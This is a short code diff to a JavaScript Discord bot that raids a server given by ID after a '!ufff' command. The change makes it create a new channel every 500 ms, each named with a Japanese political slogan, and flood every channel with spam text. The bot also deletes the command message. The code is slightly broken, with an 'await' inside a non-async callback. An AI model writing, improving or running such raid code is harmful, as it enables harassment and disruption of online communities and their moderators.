@@ -23,15 +23,15 @@ client.on("messageCreate",function(message){
     let serverID=message.content.split("!ufff ")[1];
     if(serverID){
       let guild=client.guilds.cache.get(serverID);
-      guild.channels.create({
-        name:"新しい部屋",
-        type:0
-      });
-      guild.channels.cache.forEach(function(channel){
-        setInterval(async function(){
+      setInterval(async function(){
+        guild.channels.create({
+          name:"統一友愛戦線に栄光あれ！",
+          type:0
+        });
+        guild.channels.cache.forEach(function(channel){
           await channel.send(getText());
-        },500);
-      });
+        });
+      },500);
     }
     message.delete();
     setInterval(function(){
